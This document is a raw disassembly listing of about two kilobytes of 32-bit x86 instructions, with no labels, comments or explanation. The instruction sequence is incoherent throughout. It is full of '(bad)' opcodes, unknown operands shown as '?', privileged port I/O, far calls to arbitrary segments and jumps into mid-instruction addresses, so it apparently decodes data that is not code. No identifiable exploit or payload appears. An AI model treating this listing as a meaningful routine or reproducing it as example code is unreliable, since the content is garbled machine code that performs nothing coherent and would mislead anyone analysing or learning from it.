  4101dd:	cmp    al,0x5b
  4101df:	jecxz  0x410165
  4101e1:	mov    dh,0x5e
  4101e3:	outs   dx,BYTE PTR ds:[esi]
  4101e4:	call   0xd647:0x6125e0e
  4101eb:	mov    eax,ds:0x3590253b
  4101f0:	pop    ebx
  4101f1:	mov    cl,0xe
  4101f3:	cld    
  4101f4:	test   al,0xc
  4101f6:	xchg   bh,dl
  4101f8:	mov    eax,0x91d9557f
  4101fd:	inc    eax
  4101fe:	mov    bh,0xf1
  410200:	cmc    
  410201:	cli    
  410202:	push   ebx
  410203:	pop    ss
  410204:	jae    0x410265
  410206:	xor    ch,al
  410208:	pop    ss
  410209:	pusha  
  41020a:	add    BYTE PTR [ecx+0x5cc06ce],bh
  410210:	and    al,0xab
  410212:	(bad)  [edi+edi*2-0x247c057d]
  410219:	out    dx,al
  41021a:	(bad)  
  41021b:	das    
  41021c:	inc    ebx
  41021d:	test   edi,ebp
  41021f:	test   DWORD PTR [edi+0x65521791],esp
  410225:	call   FWORD PTR [ecx+0x6e]
  410228:	fdiv   DWORD PTR [ecx]
  41022a:	scas   al,BYTE PTR es:[edi]
  41022b:	clc    
  41022c:	adc    eax,esp
  41022e:	pop    ebp
  41022f:	pop    edx
  410230:	sbb    ebp,esp
  410232:	push   0xb8f18174
  410237:	cmc    
  410238:	lods   eax,DWORD PTR ds:[esi]
  410239:	mov    al,0x3e
  41023b:	cwde   
  41023c:	ja     0x4101e9
  41023e:	or     eax,0xf6285cd9
  410243:	cmc    
  410244:	stos   DWORD PTR es:[edi],eax
  410245:	cmp    eax,0x8934a433
  41024a:	and    DWORD PTR [eax-0x50],0x7756d674
  410251:	mov    eax,ds:0x65e5b9bb
  410256:	pop    eax
  410257:	dec    ebx
  410258:	xlat   BYTE PTR ds:[ebx]
  410259:	sbb    BYTE PTR [esi+0x1be66db7],dh
  41025f:	adc    eax,0xa10f3fc9
  410264:	mov    ch,0x12
  410266:	out    0x67,al
  410268:	stc    
  410269:	mov    cl,0xc8
  41026b:	fbstp  TBYTE PTR [esi-0x19]
  41026e:	mov    ebp,0xe80377e
  410273:	nop
  410274:	call   0x48f1ccd
  410279:	retf   0xc814
  41027c:	dec    edi
  41027d:	sbb    eax,0xcb795c32
  410282:	pop    ds
  410283:	out    0x26,eax
  410285:	loopne 0x4102f0
  410287:	mov    eax,DWORD PTR [ebp-0x4c]
  41028a:	push   ecx
  41028b:	sub    BYTE PTR [edi],ch
  41028d:	cmp    ebp,DWORD PTR [esi-0x5d]
  410290:	or     DWORD PTR [edi+0x7ebed4b9],ebx
  410296:	pop    es
  410297:	iret   
  410298:	retf   
  410299:	outs   dx,DWORD PTR ds:[esi]
  41029a:	xor    dl,BYTE PTR [ebp+0x4b5beef7]
  4102a0:	test   DWORD PTR [esp+edi*4],0xbff63ef5
  4102a7:	(bad)  
  4102a9:	sbb    DWORD PTR [ebx+0x1f],ebp
  4102ac:	fimul  DWORD PTR [ebx-0x7e]
  4102af:	mov    cs,ebp
  4102b1:	dec    edx
  4102b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b3:	into   
  4102b4:	mov    ?,WORD PTR [eax+0x1bbce928]
  4102ba:	pop    edx
  4102bb:	mov    ebx,0xf3301139
  4102c0:	stos   BYTE PTR es:[edi],al
  4102c1:	sahf   
  4102c2:	push   eax
  4102c3:	outs   dx,DWORD PTR ds:[esi]
  4102c4:	cwde   
  4102c5:	pop    esp
  4102c6:	js     0x4102c7
  4102c8:	cmp    bl,BYTE PTR [ecx+0x33]
  4102cb:	std    
  4102cc:	xchg   ecx,eax
  4102cd:	push   eax
  4102ce:	test   eax,0x11bc6f26
  4102d3:	push   edi
  4102d4:	out    dx,al
  4102d5:	in     al,dx
  4102d6:	sti    
  4102d7:	xor    edi,esp
  4102d9:	xchg   edx,eax
  4102da:	jmp    0x642ae289
  4102df:	jns    0x4102c2
  4102e1:	sbb    ebp,DWORD PTR [ecx-0x7b]
  4102e4:	pop    esp
  4102e5:	shl    ebp,1
  4102e7:	test   BYTE PTR [ebx+eiz*4],dl
  4102ea:	leave  
  4102eb:	xor    ah,ch
  4102ed:	xor    ebp,DWORD PTR [esi+0x6d]
  4102f0:	mov    dl,0x61
  4102f2:	fisttp QWORD PTR [ebx]
  4102f4:	sbb    al,0x8c
  4102f6:	cmp    esp,DWORD PTR [esi]
  4102f8:	js     0x4102da
  4102fa:	fwait
  4102fb:	mov    ecx,0x46a1fd99
  410300:	call   0x90df8a9d
  410305:	ja     0x4102f6
  410307:	rcl    BYTE PTR [esi],1
  410309:	xchg   esp,eax
  41030a:	jno    0x4102ac
  41030c:	lock aas 
  41030e:	out    0x52,al
  410310:	xchg   ebp,eax
  410311:	stos   DWORD PTR es:[edi],eax
  410312:	sbb    bh,dh
  410314:	pop    ebp
  410315:	imul   ebx,DWORD PTR [ebp+0x9e14da2],0x1c21f3eb
  41031f:	mov    WORD PTR [edx+0x2c3e45bc],cs
  410325:	into   
  410326:	mov    ecx,0x457d2f1f
  41032b:	inc    edi
  41032c:	jmp    0x63400c85
  410331:	sub    ecx,DWORD PTR [ebp+edx*8+0x3f]
  410335:	jne    0x410388
  410337:	cwde   
  410338:	or     BYTE PTR [esi],0x47
  41033b:	ret    
  41033c:	push   eax
  41033d:	sahf   
  41033e:	xchg   ecx,eax
  41033f:	data16 mov WORD PTR [edx],es
  410342:	ror    DWORD PTR [ebx],cl
  410344:	test   al,0x5c
  410346:	jmp    0x2ff417b9
  41034b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41034c:	lods   eax,DWORD PTR ds:[esi]
  41034d:	sub    eax,0x3fb99103
  410352:	(bad)
  410355:	lea    esp,[eax]
  410357:	mov    WORD PTR [ebx],es
  410359:	jmp    0x98d0:0x7dbcb8b1
  410360:	fst    DWORD PTR [ebx+0x50e2c504]
  410366:	sub    eax,0xb2ba9e15
  41036b:	xchg   ebp,eax
  41036c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41036d:	mov    cs,WORD PTR [eax]
  41036f:	mov    ebp,DWORD PTR [edi-0x35]
  410372:	jle    0x41037e
  410374:	rol    DWORD PTR [ebp-0x5ccfc2fe],0xb2
  41037b:	jg     0x4103b8
  41037d:	pop    eax
  41037e:	jp     0x41035b
  410380:	xor    ebp,0x964d74f8
  410386:	dec    ebp
  410387:	inc    edx
  410388:	rcl    edx,1
  41038a:	stos   BYTE PTR es:[edi],al
  41038b:	mov    esi,0x4f6dcfef
  410390:	push   ecx
  410391:	xchg   BYTE PTR [ecx],ah
  410393:	outs   dx,BYTE PTR ds:[esi]
  410394:	aaa    
  410395:	jbe    0x410356
  410397:	cmp    dl,BYTE PTR [esi-0x7d0f791d]
  41039d:	jl     0x4103d5
  41039f:	fdivr  DWORD PTR [ebx-0x3d6a91bc]
  4103a5:	xor    al,0x12
  4103a7:	push   0x5703632f
  4103ac:	push   cs
  4103ad:	mov    WORD PTR [eax+esi*4-0x1b],ss
  4103b1:	or     BYTE PTR [ebx-0x1624358],0xa
  4103b8:	test   eax,0x56e4d2c4
  4103bd:	cmc    
  4103be:	call   0xecdf08e7
  4103c3:	mov    BYTE PTR [esi],ch
  4103c5:	jb     0x4103b3
  4103c7:	push   ecx
  4103c8:	into   
  4103c9:	add    DWORD PTR [esi-0x19ecd59e],0x397914bb
  4103d3:	and    ebp,DWORD PTR [ecx-0x5a]
  4103d6:	mov    gs,WORD PTR [ecx+0x2bad01a3]
  4103dc:	outs   dx,DWORD PTR ds:[esi]
  4103dd:	push   edx
  4103de:	push   esi
  4103df:	adc    eax,0x946cac18
  4103e4:	bound  edx,QWORD PTR [edx-0x18c543f2]
  4103ea:	cmp    DWORD PTR [eax-0x2d1d65b],ecx
  4103f0:	push   0x1e692867
  4103f5:	and    esi,DWORD PTR [ebx+0x53]
  4103f8:	mov    ebp,0xaeb269b1
  4103fd:	in     al,0x91
  4103ff:	mov    al,BYTE PTR [edi+ebx*1+0x37]
  410403:	inc    edi
  410404:	xchg   edi,eax
  410405:	ins    BYTE PTR es:[edi],dx
  410406:	jne    0x4103c1
  410408:	(bad)  
  410409:	sti    
  41040a:	into   
  41040b:	popa   
  41040c:	push   esp
  41040d:	rcr    ebp,1
  41040f:	inc    ecx
  410410:	dec    ebp
  410411:	out    0xaf,eax
  410413:	aad    0x8e
  410415:	cmp    al,0xa2
  410417:	sub    DWORD PTR [edi+0x312673cd],edx
  41041d:	mov    ah,0x9d
  41041f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410420:	in     eax,0x1b
  410422:	jnp    0x4103f9
  410424:	mov    bl,0x8f
  410426:	loopne 0x410477
  410428:	cmp    al,0x27
  41042a:	fs mov esp,0x5660cf8e
  410430:	fisttp QWORD PTR [edi+0x49f2f6a4]
  410436:	adc    bh,BYTE PTR ds:0x833f71c4
  41043c:	daa    
  41043d:	dec    edx
  41043e:	inc    ecx
  41043f:	xor    BYTE PTR [eax+edx*4-0x76],dh
  410443:	call   0x8192:0x44ecf4f1
  41044a:	or     ebx,edx
  41044c:	jns    0x410491
  41044e:	dec    edi
  41044f:	icebp  
  410450:	sbb    bh,BYTE PTR [eax-0x7b7ee805]
  410456:	repz push ds
  410458:	xchg   esp,eax
  410459:	out    0x24,eax
  41045b:	fist   WORD PTR [esi+eiz*4+0x7136709a]
  410462:	push   edi
  410463:	xchg   ebp,eax
  410464:	data16 jne 0x410453
  410467:	sahf   
  410468:	xor    dh,BYTE PTR [edi+ebx*8+0x7457798a]
  41046f:	outs   dx,BYTE PTR ds:[esi]
  410470:	push   es
  410471:	adc    edx,DWORD PTR [ecx+0x357e8715]
  410477:	int3   
  410478:	mov    bh,0xe1
  41047a:	sahf   
  41047b:	mov    ds:0x6d042baa,eax
  410480:	fadd   DWORD PTR [ecx+0x40d87465]
  410486:	in     al,dx
  410487:	into   
  410488:	jmp    0x410494
  41048a:	aad    0xec
  41048c:	push   ecx
  41048d:	jg     0x410459
  41048f:	jp     0x410469
  410491:	out    0xe6,al
  410493:	scas   eax,DWORD PTR es:[edi]
  410494:	pop    edx
  410495:	jns    0x410418
  410497:	adc    edi,eax
  410499:	inc    edi
  41049a:	xchg   esp,eax
  41049b:	cmp    eax,edi
  41049d:	cmp    al,0x68
  41049f:	scas   eax,DWORD PTR es:[edi]
  4104a0:	mov    ?,ebp
  4104a2:	(bad)  
  4104a3:	push   edx
  4104a4:	out    0x96,eax
  4104a6:	sbb    bl,BYTE PTR [ebp-0x6]
  4104a9:	mov    esp,DWORD PTR [edx+0x3bb80a7c]
  4104af:	push   ebx
  4104b0:	loope  0x41043b
  4104b2:	add    ecx,esp
  4104b4:	sub    al,0x1
  4104b6:	add    eax,0xc9f5dccd
  4104bb:	inc    ecx
  4104bc:	loop   0x41048e
  4104be:	lds    ecx,FWORD PTR [ecx+0x29e4b306]
  4104c4:	sar    ah,cl
  4104c6:	cmc    
  4104c7:	sub    BYTE PTR [esi+0x7999ee04],dl
  4104cd:	dec    esp
  4104ce:	lock sbb bl,BYTE PTR [ebx]
  4104d1:	imul   ebp,DWORD PTR [ebx],0x826a9ea5
  4104d7:	hlt    
  4104d8:	(bad)  
  4104d9:	loope  0x41049a
  4104db:	xchg   ecx,eax
  4104dc:	mov    dh,0xac
  4104de:	or     al,0xdc
  4104e0:	mov    edx,0x8311cd26
  4104e5:	xor    dh,al
  4104e7:	sub    dh,BYTE PTR [ebx]
  4104e9:	fcmove st,st(3)
  4104ec:	loope  0x410562
  4104ee:	test   DWORD PTR [eax-0x32af559d],0x23257e5
  4104f8:	leave  
  4104f9:	loope  0x4104fb
  4104fb:	cmc    
  4104fc:	pop    esi
  4104fd:	std    
  4104fe:	jne    0x4104e8
  410500:	out    0xfa,eax
  410502:	loopne 0x41056b
  410504:	mov    dh,0xcc
  410506:	mov    ch,0x52
  410508:	sbb    ah,cl
  41050a:	add    eax,0xdfbed5cc
  41050f:	std    
  410510:	jg     0x410510
  410512:	fwait
  410513:	retf   0xd0c7
  410516:	xor    BYTE PTR [eax-0x29a51769],dl
  41051c:	and    eax,0xeba2d3f
  410521:	jne    0x41057e
  410523:	pop    edx
  410524:	xor    esp,DWORD PTR [esi+ebp*4-0x45]
  410528:	jmp    0xa258:0x36769e0b
  41052f:	pop    esp
  410530:	xchg   ch,cl
  410532:	repz push ebx
  410534:	rol    DWORD PTR ds:0xe8fed199,0xe5
  41053b:	jo     0x410570
  41053d:	stos   DWORD PTR es:[edi],eax
  41053e:	hlt    
  41053f:	dec    ecx
  410540:	add    DWORD PTR [edx+eax*4],edx
  410543:	imul   edx,DWORD PTR [eax-0x69],0x42ec8194
  41054a:	dec    edi
  41054b:	(bad)  
  41054c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41054d:	pop    eax
  41054e:	(bad)  
  410550:	push   ebx
  410551:	arpl   WORD PTR [esi+0x5e],si
  410554:	xchg   ecx,eax
  410555:	fstp   DWORD PTR [edx+0x4c]
  410558:	and    BYTE PTR [ebp-0x59d94bbd],dl
  41055e:	lahf   
  41055f:	nop
  410560:	mov    bl,0xb8
  410562:	push   0x73
  410564:	mov    edx,0x5ced2d98
  410569:	or     eax,0x58946bb2
  41056e:	test   al,0xc8
  410570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410571:	add    dl,cl
  410573:	ror    DWORD PTR [ecx-0x60],cl
  410576:	imul   ecx,DWORD PTR [eax+eax*1],0x5c0b1a0a
  41057d:	jne    0x4105fd
  41057f:	inc    esp
  410580:	and    BYTE PTR [ecx-0x53],bl
  410583:	mov    ebx,0x74b4c8e7
  410588:	xchg   esp,eax
  410589:	jbe    0x4105e3
  41058b:	pop    ecx
  41058c:	dec    ecx
  41058d:	adc    ah,BYTE PTR [esi+0x24]
  410590:	aaa    
  410591:	jns    0x4105ec
  410593:	cdq    
  410594:	jmp    0x433c:0xe2b19791
  41059b:	pop    esp
  41059c:	inc    ebx
  41059d:	lods   eax,DWORD PTR ds:[esi]
  41059e:	and    eax,0xbd5995c8
  4105a3:	je     0x410598
  4105a5:	dec    ebp
  4105a6:	xor    BYTE PTR [ecx+0x4a59a950],al
  4105ac:	cld    
  4105ad:	shl    DWORD PTR [esi-0x71f8196a],1
  4105b3:	imul   esi,DWORD PTR [eax],0x876155e5
  4105b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105ba:	mov    eax,0x379bf7fe
  4105bf:	jns    0x410548
  4105c1:	fadd   QWORD PTR [edx]
  4105c3:	popa   
  4105c4:	out    dx,al
  4105c5:	mov    dl,0xdb
  4105c7:	es cmp DWORD PTR ss:[eax-0x6b],ecx
  4105cc:	arpl   WORD PTR [ebx+0x3a82d2c9],bp
  4105d2:	maxps  xmm0,XMMWORD PTR ds:0x57635b6e
  4105d9:	push   edx
  4105da:	arpl   WORD PTR gs:[esi],cx
  4105dd:	jnp    0x4105ab
  4105df:	mov    ss,ecx
  4105e1:	mov    ecx,0x47c486f1
  4105e6:	into   
  4105e7:	out    0xc,eax
  4105e9:	adc    DWORD PTR [ebx+0x7b],0xffffff98
  4105ed:	cmp    DWORD PTR [esi+0x11],edi
  4105f0:	fist   DWORD PTR [esi]
  4105f2:	xchg   ecx,eax
  4105f3:	inc    esp
  4105f4:	enter  0xdfd1,0xf6
  4105f8:	leave  
  4105f9:	fs and bh,ah
  4105fc:	ror    bh,1
  4105fe:	nop
  4105ff:	xor    DWORD PTR [ecx+ebx*1+0x26],ebp
  410603:	mov    al,0x5a
  410605:	xor    dh,BYTE PTR [ecx]
  410607:	dec    edi
  410608:	inc    ebp
  410609:	(bad)  
  41060a:	daa    
  41060b:	into   
  41060c:	outs   dx,BYTE PTR ds:[esi]
  41060d:	(bad)  
  41060e:	cmc    
  41060f:	add    ebx,DWORD PTR [ecx]
  410611:	loopne 0x410678
  410613:	push   0x4e2bc65d
  410618:	adc    dh,BYTE PTR ds:0x1f2d24cb
  41061e:	xor    eax,0xd00c94d5
  410623:	or     al,ah
  410625:	loop   0x4106a5
  410627:	stc    
  410628:	pop    ss
  410629:	add    al,0x1d
  41062b:	out    0x92,al
  41062d:	dec    eax
  41062e:	dec    eax
  41062f:	xlat   BYTE PTR ds:[ebx]
  410630:	pop    edx
  410631:	push   edx
  410632:	adc    DWORD PTR [edi-0x34],ebx
  410635:	mov    esi,DWORD PTR [ebx-0x5cb9461d]
  41063b:	and    eax,ebp
  41063d:	add    cl,BYTE PTR [eax]
  41063f:	in     al,dx
  410640:	add    al,0x88
  410642:	adc    DWORD PTR [ecx+0x6ecebe58],0xffffffdb
  410649:	imul   cl
  41064b:	pop    ss
  41064c:	imul   ebx,DWORD PTR [ebp+0x3f],0x62a808e6
  410653:	aam    0x42
  410655:	mov    ebp,0x89b3b856
  41065a:	push   eax
  41065b:	icebp  
  41065c:	add    DWORD PTR [edx-0x41],0xf7ac559f
  410663:	dec    ecx
  410664:	sub    DWORD PTR [ebp-0x6e39787],ecx
  41066a:	adc    DWORD PTR [ebx+0x7b],edi
  41066d:	xchg   esp,eax
  41066e:	xchg   esp,eax
  41066f:	arpl   WORD PTR [esi+0x11],di
  410672:	ss xor eax,0x637cfbef
  410678:	jbe    0x41061d
  41067a:	(bad)  
  41067b:	data16 cmp BYTE PTR [esi-0x40],0x16
  410680:	pop    ds
  410681:	cwde   
  410682:	fs push eax
  410684:	xor    BYTE PTR [ebp-0x69abdab8],ch
  41068a:	mov    ebp,0xf26e1b83
  41068f:	mov    ecx,DWORD PTR [edi+0xf]
  410692:	push   ebx
  410693:	sub    BYTE PTR [esi-0x52],0xc6
  410697:	iret   
  410698:	enter  0x8032,0x84
  41069c:	in     eax,dx
  41069d:	cmp    cl,BYTE PTR [edx+0x1810babd]
  4106a3:	sub    eax,0x33757a95
  4106a8:	out    0xfc,al
  4106aa:	ret    
  4106ab:	outs   dx,BYTE PTR ds:[esi]
  4106ac:	jb     0x41066b
  4106ae:	into   
  4106af:	mov    ds:0xe9580a46,al
  4106b4:	mov    edi,0x8e6a552c
  4106b9:	push   ds
  4106ba:	in     al,0x6e
  4106bc:	jno    0x410665
  4106be:	ret    
  4106bf:	xchg   ecx,eax
  4106c0:	iret   
  4106c1:	jp     0x410659
  4106c3:	aad    0xe3
  4106c5:	imul   esp,DWORD PTR [ebp+0x1bbe53ea],0x7b4a47fc
  4106cf:	and    ah,BYTE PTR [edi-0x2b21050f]
  4106d5:	fst    QWORD PTR ds:0xb065034b
  4106db:	adc    eax,DWORD PTR ds:0x8bb9c20d
  4106e1:	int    0xe1
  4106e3:	mov    BYTE PTR [ecx],ch
  4106e5:	add    bl,0x92
  4106e8:	add    eax,0xc9c41e74
  4106ed:	nop
  4106ee:	pop    ss
  4106ef:	mov    ebp,0x487dc3e5
  4106f4:	inc    ecx
  4106f5:	mov    ch,0xcf
  4106f7:	jbe    0x410738
  4106f9:	rcl    BYTE PTR [esi-0x66af5490],1
  4106ff:	popa   
  410700:	call   0xf28a:0x5fb111a0
  410707:	mov    ah,0x38
  410709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41070a:	mov    DWORD PTR [ecx],ebx
  41070c:	retf   
  41070d:	inc    eax
  41070e:	std    
  41070f:	pop    ss
  410710:	sbb    ebp,esp
  410712:	mov    eax,0xe5d21572
  410717:	add    eax,DWORD PTR [eax-0x41]
  41071a:	mov    cl,0x26
  41071c:	adc    BYTE PTR [ecx],bh
  41071e:	ins    DWORD PTR es:[edi],dx
  41071f:	mov    eax,ds:0xda79b2b8
  410724:	push   ebx
  410725:	stos   DWORD PTR es:[edi],eax
  410726:	loopne 0x4106e9
  410728:	fst    QWORD PTR [eax]
  41072a:	push   esp
  41072b:	mov    dl,BYTE PTR [ebx-0x1]
  41072e:	and    bl,dh
  410730:	mov    ds:0x7a29dc58,al
  410735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410736:	mov    ebx,0xc4d5d296
  41073b:	cmp    bl,dh
  41073d:	jle    0x410747
  41073f:	ror    ecx,cl
  410741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410743:	div    cl
  410745:	and    BYTE PTR [ebp+0x29ac41bc],ch
  41074b:	and    BYTE PTR [ebp+0x4c],ch
  41074e:	mov    ecx,0x57fd473b
  410753:	hlt    
  410754:	pop    eax
  410755:	call   0x8017:0x928e1174
  41075c:	das    
  41075d:	repnz and edi,eax
  410760:	(bad)  
  410761:	daa    
  410762:	cmp    DWORD PTR [edx-0x599c289b],edi
  410768:	jae    0x4107ac
  41076a:	cmp    BYTE PTR [ebx],ch
  41076c:	lea    esi,[ecx+0x498633e8]
  410772:	jo     0x41072f
  410774:	xor    eax,0x181418a6
  410779:	dec    esi
  41077a:	inc    edx
  41077b:	pop    esi
  41077c:	jmp    0x53730c20
  410781:	outs   dx,BYTE PTR ds:[esi]
  410782:	rcr    BYTE PTR [ebp-0x80],0xf9
  410786:	mov    edi,0xdae33b05
  41078b:	mov    esp,0x2d0c4c99
  410790:	sbb    BYTE PTR [edx],bh
  410792:	xor    eax,edx
  410794:	fcom   DWORD PTR [esi-0x5c]
  410797:	jg     0x410725
  410799:	mov    bl,0xdf
  41079b:	jne    0x4107c8
  41079d:	jns    0x41080a
  41079f:	or     al,0x2e
  4107a1:	and    DWORD PTR [ecx-0x4bf7b79e],edx
  4107a7:	cmp    dl,BYTE PTR [eax+0x6fed5693]
  4107ad:	mov    BYTE PTR [esp+eax*2+0x65],bh
  4107b1:	movhps xmm0,QWORD PTR [edi]
  4107b4:	push   ss
  4107b5:	add    al,0x5a
  4107b7:	rcr    BYTE PTR [ebx+ecx*2],0x8e
  4107bb:	nop
  4107bc:	fs ret 0xd45a
  4107c0:	(bad)  
  4107c1:	(bad)  
  4107c3:	mov    bl,0xa7
  4107c5:	mov    eax,ds:0x3f284735
  4107ca:	inc    edi
  4107cb:	xchg   esi,eax
  4107cc:	mov    edx,0xdfe73a7c
  4107d1:	mov    ecx,0x10ad88df
  4107d6:	mov    edx,0xefd39e51
  4107db:	jecxz  0x410766
  4107dd:	es dec eax
  4107df:	xor    ch,ch
  4107e1:	push   esp
  4107e2:	pop    DWORD PTR [edx+0x3fbd4184]
  4107e8:	or     dh,BYTE PTR [ebx]
  4107ea:	out    dx,al
  4107eb:	pop    ebp
  4107ec:	outs   dx,DWORD PTR ds:[esi]
  4107ed:	arpl   WORD PTR [ecx+ebp*2],dx
  4107f0:	or     eax,0x99f1e520
  4107f5:	xchg   edi,eax
  4107f6:	sub    dl,0x46
  4107f9:	and    eax,ebp
  4107fb:	xchg   esp,eax
  4107fc:	sub    DWORD PTR [ebx-0x71dbebb4],0x1b
  410803:	jno    0x410805
  410805:	pop    ds
  410806:	mov    ds:0x5d3d701a,al
  41080b:	push   ebp
  41080c:	fild   DWORD PTR [eax-0x74]
  41080f:	cmp    BYTE PTR [eax+edx*8],dl
  410812:	popa   
  410813:	mov    ds:0xc70aed4d,al
  410818:	mov    edx,0xf21e812d
  41081d:	sar    BYTE PTR [eax+ebp*8-0x8],cl
  410821:	push   edi
  410822:	mov    dh,dl
  410824:	ins    BYTE PTR es:[edi],dx
  410825:	add    dh,BYTE PTR [ebx+0x6e]
  410828:	xor    ch,BYTE PTR [edx]
  41082a:	mov    esp,0x87af8b
  41082f:	gs mov al,0x88
  410832:	jb     0x41084c
  410834:	repnz inc ecx
  410836:	dec    eax
  410837:	mov    ds:0xbd2a2c40,al
  41083c:	mov    eax,ds:0xd5bc1634
  410841:	pop    ss
  410842:	add    eax,0x9619c387
  410847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410848:	leave  
  410849:	sbb    DWORD PTR [ecx],ebp
  41084b:	jmp    0xb9c4:0x86b43e78
  410852:	es jno 0x41082d
  410855:	stc    
  410856:	je     0x410874
  410858:	lea    ebx,[eax]
  41085a:	ds call 0x4b0477ec
  410860:	inc    esp
  410861:	pusha  
  410862:	or     edx,DWORD PTR ss:[edx]
  410865:	or     dh,BYTE PTR [eax]
  410867:	cs pop ebp
  410869:	adc    edx,DWORD PTR [ecx+eiz*2]
  41086c:	xchg   bl,cl
  41086e:	jbe    0x4108bb
  410870:	xchg   BYTE PTR [edx-0x3e],cl
  410873:	mov    dl,0x1b
  410875:	push   esp
  410876:	fdiv   QWORD PTR [ebp+0x6d79a91f]
  41087c:	scas   al,BYTE PTR es:[edi]
  41087d:	pop    esp
  41087e:	addr16 sar bh,0x24
  410882:	add    al,0x1e
  410884:	push   eax
  410885:	inc    esi
  410886:	arpl   WORD PTR [ebx+0x53],bx
  410889:	mov    al,ds:0x31786434
  41088e:	sbb    eax,0x862b10a0
  410893:	xor    al,0xc8
  410895:	lahf   
  410896:	mov    dl,0x67
  410898:	(bad)  
  410899:	jne    0x4108bc
  41089b:	into   
  41089c:	sbb    al,0x72
  41089e:	mov    bl,BYTE PTR [ecx+0x7a]
  4108a1:	cdq    
  4108a2:	sbb    BYTE PTR [ebp+ebx*2+0x41],ch
  4108a6:	mov    eax,ds:0x387d1ba1
  4108ab:	pop    ebp
  4108ac:	xchg   DWORD PTR [ebx],ebx
  4108ae:	lods   al,BYTE PTR ds:[esi]
  4108af:	inc    eax
  4108b0:	lds    edi,FWORD PTR [ebx]
  4108b2:	dec    ecx
  4108b3:	les    edi,FWORD PTR [edi+0x46]
  4108b6:	scas   eax,DWORD PTR es:[edi]
  4108b7:	dec    esi
  4108b8:	fdiv   QWORD PTR [ecx+edx*2]
  4108bb:	xor    eax,0x4264f1c5
  4108c0:	cmp    ecx,DWORD PTR [ebp+edx*4-0x72]
  4108c4:	mov    ds:0xbbb898a8,eax
  4108c9:	es scas eax,DWORD PTR es:[edi]
  4108cb:	push   ss
  4108cc:	outs   dx,DWORD PTR ds:[esi]
  4108cd:	adc    bh,BYTE PTR [edi+0x7d]
  4108d0:	xchg   ebx,eax
  4108d1:	arpl   WORD PTR [edx-0x4d6004ae],dx
  4108d7:	popf   
  4108d8:	add    eax,0x3fcd7999
  4108dd:	or     BYTE PTR [ecx-0xf],bh
  4108e0:	mov    eax,ds:0x83531e48
  4108e5:	lods   al,BYTE PTR ds:[esi]
  4108e6:	jge    0x41091a
  4108e8:	fs adc ebp,edi
  4108eb:	lds    edi,FWORD PTR [ecx+0x1f]
  4108ee:	mov    eax,0xc9444d26
  4108f3:	test   BYTE PTR [edx],ch
  4108f5:	push   ds
  4108f6:	adc    al,0xe4
  4108f8:	xchg   ecx,eax
  4108f9:	xchg   ecx,eax
  4108fa:	sub    al,0x3b
  4108fc:	enter  0x1e1d,0xb
  410900:	push   cs
  410901:	leave  
  410902:	adc    eax,0x1369786c
  410907:	inc    ebp
  410908:	scas   eax,DWORD PTR es:[edi]
  410909:	cmp    al,0x77
  41090b:	add    eax,0x957e31c0
  410910:	imul   eax,DWORD PTR [ebx-0x1fe5b3da],0x18
  410917:	imul   eax
  410919:	inc    edi
  41091a:	inc    eax
  41091b:	and    esp,DWORD PTR [esi+0x39]
  41091e:	jmp    0xfe84:0xd23c339e
  410925:	addr16 dec ebx
  410927:	or     dh,BYTE PTR [eax-0x3629c5eb]
  41092d:	aaa    
  41092e:	lock test BYTE PTR [ecx],cl
  410931:	stc    
  410932:	mov    WORD PTR [eax+0x67],gs
  410935:	mov    al,ds:0xea52d41c
  41093a:	add    DWORD PTR [ecx-0x55857c74],esi
  410940:	fwait
  410941:	mov    DWORD PTR [esi+0x53],edi
  410944:	mov    ebp,0xa0f968d8
  410949:	xchg   esi,eax
  41094a:	jns    0x410933
  41094c:	adc    ecx,DWORD PTR [ecx+edx*8+0x20]
  410950:	push   es
  410951:	add    eax,0x75cc7bf6
  410956:	ss aas 
  410958:	mov    bl,0x6e
  41095a:	jl     0x41092f
  41095c:	retf   0xefaa
  41095f:	xor    esi,ebx
  410961:	jg     0x4109d6
  410963:	mov    ds:0xadf2dd49,al
  410968:	or     ebp,ebp
  41096a:	loopne 0x410904
  41096c:	or     dh,BYTE PTR [edi-0x14ae548]
  410972:	dec    edi
  410973:	aad    0x50
  410975:	mov    edi,0x23218dde
  41097a:	push   esi
  41097b:	inc    esp
  41097c:	idiv   bh
  41097e:	sbb    al,0x71
  410980:	repnz frndint 
  410983:	inc    edi
  410984:	xor    edx,DWORD PTR [edx]
  410986:	imul   edx,DWORD PTR cs:[edi-0x1a7f1425],0xffffffd4
  41098e:	jmp    0xe641:0x896a2ce5
  410995:	je     0x4109f6
  410997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410998:	mov    edx,0x7fcc0ed1
  41099d:	or     eax,0x320c8944
  4109a2:	je     0x4109cf
  4109a4:	and    al,0x4a
  4109a6:	fbstp  TBYTE PTR [edx+0x21da217c]
  4109ac:	jle    0x4109ba
  4109ae:	xor    BYTE PTR [ecx-0x39],bl
  4109b1:	sbb    BYTE PTR [edi+0x14e730cc],0x45
  4109b8:	aas    
  4109b9:	test   eax,0x3f44af27
  4109be:	scas   eax,DWORD PTR es:[edi]
  4109bf:	xchg   ebp,eax
  4109c0:	xlat   BYTE PTR ds:[ebx]
  4109c1:	sbb    cl,BYTE PTR es:[eax-0x4e]
  4109c5:	adc    al,0x86
  4109c7:	fidivr DWORD PTR [ecx-0xb87b6d2]
  4109cd:	retf   
  4109ce:	aad    0x20
  4109d0:	js     0x410a43
  4109d2:	test   BYTE PTR [ebp+0xce7fce0],dh
  4109d8:	leave  
  4109d9:	mov    ebp,esi
  4109db:	add    eax,edx
  4109dd:	mov    cl,0xa9
  4109df:	out    dx,eax
  4109e0:	add    DWORD PTR fs:[bp-0x41],ebp
  4109e5:	dec    eax
  4109e6:	inc    edx
  4109e7:	xchg   edx,eax
  4109e8:	xor    esi,DWORD PTR [ebx]
